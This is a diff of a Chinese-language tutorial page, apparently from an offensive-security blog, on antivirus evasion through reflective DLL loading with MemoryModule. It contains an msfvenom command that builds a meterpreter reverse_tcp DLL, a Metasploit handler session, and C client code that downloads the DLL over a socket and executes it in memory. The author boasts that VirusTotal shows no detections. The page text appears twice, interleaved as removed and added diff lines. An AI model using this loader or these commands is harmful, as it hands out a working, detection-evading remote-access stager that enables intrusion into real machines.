+</span></span></code></pre></div><p>通过LoadLibrary这个API来加载DLL文件，使其运行，看起来是一个基础操作，那么还有另外一种方式吗？</p><p>接下来贴上MemoryModule的使用方法：</p><ol><li>将要加载的PE文件读入内存</li><li>初始化MemoryModule句柄</li><li>装载内存</li><li>获得导出函数地址</li><li>执行导出函数</li><li>释放MemoryModule句柄</li></ol><p>这里我将MemoryModule项目代码放入当前项目：</p><p><img src=https://images.payloads.online/824455c4-4f5f-11ec-b777-00d861bf4abb.png alt=2020-01-03-13-06-38></p><p>主要是：<code>MemoryModule.h</code>、<code>MemoryModule.cpp</code></p><p>加载代码</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;Windows.h&gt;;</span><span style=color:#75715e>
 </span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
 </span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&#34;MemoryModule.h&#34;</span><span style=color:#75715e>
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span>
@@ -169,160 +198,27 @@
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>GetLastError</span>();
 </span></span><span style=display:flex><span>}
-</span></span></code></pre></td></tr></table></div></div><p>运行结果：</p><p><img src=https://images.payloads.online/8277ad7a-4f5f-11ec-9a01-00d861bf4abb.png alt=2020-01-03-13-06-52></p><p>能够看到，成功加载并执行了msg函数。</p><h2 id=0x03-反射dll与msf联动>0x03 反射DLL与MSF联动</h2><p>不知道大家还是否记得第五课的Socket方式加载Shellcode，这里我将复用第五课的代码来实现与MSF的联动免杀。</p><p>思路是这样的：</p><p>通过Socket将Msf生成的DLL给接收到内存中，然后载入MemoryModule中，直接执行。</p><h3 id=生成dll>生成DLL</h3><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.170.138 LPORT=8899 -f dll -o ~/y.dll
-</span></span></code></pre></td></tr></table></div></div><p><img src=https://images.payloads.online/82b32ae4-4f5f-11ec-80f1-00d861bf4abb.png alt=2020-01-03-13-07-02></p><p><strong>生成了一个5120字节的DLL</strong></p><p>然后设置一下MSF DLL发射器：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-gdscript3 data-lang=gdscript3><span style=display:flex><span>msf5 <span style=color:#f92672>&gt;</span> handler <span style=color:#f92672>-</span>p windows<span style=color:#f92672>/</span>x64<span style=color:#f92672>/</span>meterpreter<span style=color:#f92672>/</span>reverse_tcp <span style=color:#f92672>-</span>H <span style=color:#ae81ff>192.168</span><span style=color:#f92672>.</span><span style=color:#ae81ff>170.138</span> <span style=color:#f92672>-</span>P <span style=color:#ae81ff>8899</span>
-</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Payload handler running as background job <span style=color:#ae81ff>0.</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Started reverse TCP handler on <span style=color:#ae81ff>192.168</span><span style=color:#f92672>.</span><span style=color:#ae81ff>170.138</span>:<span style=color:#ae81ff>8899</span> 
-</span></span><span style=display:flex><span>msf5 <span style=color:#f92672>&gt;</span> use exploit<span style=color:#f92672>/</span>multi<span style=color:#f92672>/</span>handler 
-</span></span><span style=display:flex><span>msf5 exploit(multi<span style=color:#f92672>/</span>handler) <span style=color:#f92672>&gt;</span> set payload windows<span style=color:#f92672>/</span>patchupdllinject<span style=color:#f92672>/</span>reverse_tcp
-</span></span><span style=display:flex><span>payload <span style=color:#f92672>=&gt;</span> windows<span style=color:#f92672>/</span>patchupdllinject<span style=color:#f92672>/</span>reverse_tcp
-</span></span><span style=display:flex><span>msf5 exploit(multi<span style=color:#f92672>/</span>handler) <span style=color:#f92672>&gt;</span> set LHOST <span style=color:#ae81ff>192.168</span><span style=color:#f92672>.</span><span style=color:#ae81ff>170.138</span> 
-</span></span><span style=display:flex><span>LHOST <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>192.168</span><span style=color:#f92672>.</span><span style=color:#ae81ff>170.138</span>
-</span></span><span style=display:flex><span>msf5 exploit(multi<span style=color:#f92672>/</span>handler) <span style=color:#f92672>&gt;</span> set LPORT <span style=color:#ae81ff>8888</span>
-</span></span><span style=display:flex><span>LPORT <span style=color:#f92672>=&gt;</span> <span style=color:#ae81ff>8888</span>
-</span></span><span style=display:flex><span>msf5 exploit(multi<span style=color:#f92672>/</span>handler) <span style=color:#f92672>&gt;</span> set DLL <span style=color:#f92672>~/</span>y<span style=color:#f92672>.</span>dll
-</span></span><span style=display:flex><span>DLL <span style=color:#f92672>=&gt;</span> <span style=color:#f92672>~/</span>y<span style=color:#f92672>.</span>dll
-</span></span><span style=display:flex><span>msf5 exploit(multi<span style=color:#f92672>/</span>handler) <span style=color:#f92672>&gt;</span> exploit <span style=color:#f92672>-</span>j
-</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Exploit running as background job <span style=color:#ae81ff>1.</span>
-</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Exploit completed, but no session was created<span style=color:#f92672>.</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>[<span style=color:#f92672>*</span>] Started reverse TCP handler on <span style=color:#ae81ff>192.168</span><span style=color:#f92672>.</span><span style=color:#ae81ff>170.138</span>:<span style=color:#ae81ff>8888</span> 
-</span></span><span style=display:flex><span>msf5 exploit(multi<span style=color:#f92672>/</span>handler) <span style=color:#f92672>&gt;</span> 
-</span></span></code></pre></td></tr></table></div></div><p>此时就需要来撸码了，实现一个客户端，去Msf上获取DLL：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  1
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  2
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  3
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  4
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  5
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  6
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  7
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  8
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  9
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 10
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 11
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 12
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 13
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 14
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 15
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 16
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 17
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 18
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 19
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 20
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 21
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 22
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 23
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 24
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 25
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 26
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 27
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 28
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 29
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 30
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 31
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 32
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 33
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 34
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 35
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 36
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 37
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 38
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 39
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 40
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 41
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 42
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 43
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 44
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 45
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 46
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 47
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 48
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 49
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 50
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 51
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 52
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 53
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 54
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 55
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 56
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 57
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 58
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 59
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 60
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 61
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 62
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 63
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 64
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 65
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 66
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 67
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 68
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 69
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 70
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 71
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 72
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 73
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 74
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 75
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 76
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 77
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 78
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 79
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 80
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 81
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 82
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 83
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 84
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 85
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 86
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 87
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 88
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 89
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 90
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 91
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 92
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 93
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 94
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 95
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 96
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 97
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 98
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 99
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">100
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">101
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">102
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">103
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">104
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">105
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">106
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">107
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">108
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">109
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">110
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">111
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">112
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">113
-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;WinSock2.h&gt;</span><span style=color:#75715e>
+</span></span></code></pre></div><p>运行结果：</p><p><img src=https://images.payloads.online/8277ad7a-4f5f-11ec-9a01-00d861bf4abb.png alt=2020-01-03-13-06-52></p><p>能够看到，成功加载并执行了msg函数。</p><h2 id=0x03-反射dll与msf联动>0x03 反射DLL与MSF联动</h2><p>不知道大家还是否记得第五课的Socket方式加载Shellcode，这里我将复用第五课的代码来实现与MSF的联动免杀。</p><p>思路是这样的：</p><p>通过Socket将Msf生成的DLL给接收到内存中，然后载入MemoryModule中，直接执行。</p><h3 id=生成dll>生成DLL</h3><pre tabindex=0><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.170.138 LPORT=8899 -f dll -o ~/y.dll
+</code></pre><p><img src=https://images.payloads.online/82b32ae4-4f5f-11ec-80f1-00d861bf4abb.png alt=2020-01-03-13-07-02></p><p><strong>生成了一个5120字节的DLL</strong></p><p>然后设置一下MSF DLL发射器：</p><pre tabindex=0><code>msf5 &gt; handler -p windows/x64/meterpreter/reverse_tcp -H 192.168.170.138 -P 8899
+[*] Payload handler running as background job 0.
+
+[*] Started reverse TCP handler on 192.168.170.138:8899 
+msf5 &gt; use exploit/multi/handler 
+msf5 exploit(multi/handler) &gt; set payload windows/patchupdllinject/reverse_tcp
+payload =&gt; windows/patchupdllinject/reverse_tcp
+msf5 exploit(multi/handler) &gt; set LHOST 192.168.170.138 
+LHOST =&gt; 192.168.170.138
+msf5 exploit(multi/handler) &gt; set LPORT 8888
+LPORT =&gt; 8888
+msf5 exploit(multi/handler) &gt; set DLL ~/y.dll
+DLL =&gt; ~/y.dll
+msf5 exploit(multi/handler) &gt; exploit -j
+[*] Exploit running as background job 1.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 192.168.170.138:8888 
+msf5 exploit(multi/handler) &gt; 
+</code></pre><p>此时就需要来撸码了，实现一个客户端，去Msf上获取DLL：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;WinSock2.h&gt;</span><span style=color:#75715e>
 </span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;Windows.h&gt;</span><span style=color:#75715e>
 </span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
 </span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&#34;MemoryModule.h&#34;</span><span style=color:#75715e>
@@ -435,4 +331,4 @@
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span>	delete [] bFileBuffer;
 </span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#a6e22e>GetLastError</span>();
 </span></span><span style=display:flex><span>}
-</span></span></code></pre></td></tr></table></div></div><p>GetPEDLL函数主要是从MSF上获取DLL，通过recv函数不断接收，偏移获得DLL地址，然后扔给MemoryGetProcAddress。</p><p>实现效果如下：</p><p><img src=https://images.payloads.online/82f319d8-4f5f-11ec-a688-00d861bf4abb.png alt=2020-01-03-13-07-19></p><h2 id=0x04-总结>0x04 总结</h2><p>注意：学习的过程中，不同位数要对应不同的payload，编译平台也要互相对应</p><p>第六课就到这里了，主要是引入反射DLL加载这个技术，以及如何使用这个技术，如果想深入研究，还需要学习Windows PE相关的基础知识。</p><p>老样子，V站查杀一下：</p><p><img src=https://images.payloads.online/832a3850-4f5f-11ec-86bb-00d861bf4abb.png alt=2020-01-03-13-07-29></p><p>挑战了全球的AV，全部通过</p><p><a href=https://www.virustotal.com/gui/file/f27a16434684986206921c63a3d5d71e5ede3f95a6175fd9572a5b5029adc28c/detection>https://www.virustotal.com/gui/file/f27a16434684986206921c63a3d5d71e5ede3f95a6175fd9572a5b5029adc28c/detection</a></p><p>所有的新技术，都离不开强大的基础知识的铺垫，通过积攒基础知识，使自己能挑战更多的"不可能"。</p></div><nav class="hide-on-mobile section-nav"><nav id=TableOfContents><ol><li><a href=#0x01-memorymodule>0x01 MemoryModule</a></li><li><a href=#0x02-反射dll加载的实验>0x02 反射DLL加载的实验</a></li><li><a href=#0x03-反射dll与msf联动>0x03 反射DLL与MSF联动</a><ol><li><a href=#生成dll>生成DLL</a></li></ol></li><li><a href=#0x04-总结>0x04 总结</a></li></ol></nav></nav></div><div class=post><hr class=footer-separator><div class=tags></div><div class=back><a href=https://payloads.online/><span aria-hidden=true>← Back</span></a></div><div class=back></div></div><div class=post></div></div><div class="footer wrapper"><nav class=nav><div>2024 倾旋 All rights reserved</div></nav></div><script>feather.replace()</script><script>var enableTruncate=!0,filterDepth=!1;const MAX_DEPTH=9;window.addEventListener("DOMContentLoaded",()=>{const e=new IntersectionObserver(e=>{e.reverse().forEach(e=>{const n=e.target.getAttribute("id");if(e.intersectionRatio>0){var t=document.querySelectorAll(`nav li a[href="#${n}"]`);t!=null&&t.forEach(e=>{if(e!=null){var t=getDepth(e.parentElement);filterDepth&&t<=MAX_DEPTH&&(clearActiveStatesInTableOfContents(),e.parentElement.classList.add("active"))}else filterDepth||(clearActiveStatesInTableOfContents(),e.parentElement.classList.add("active"))})}})});document.querySelectorAll("h1[id],h2[id],h3[id],h4[id]").forEach(t=>{e.observe(t)})});function isVisible(e){if(!(e instanceof Element))return!1;const n=getComputedStyle(e);if(n.display==="none")return!1;if(n.visibility!=="visible")return!1;if(n.opacity<.1)return!1;if(e.offsetWidth+e.offsetHeight+e.getBoundingClientRect().height+e.getBoundingClientRect().width===0)return!1;const 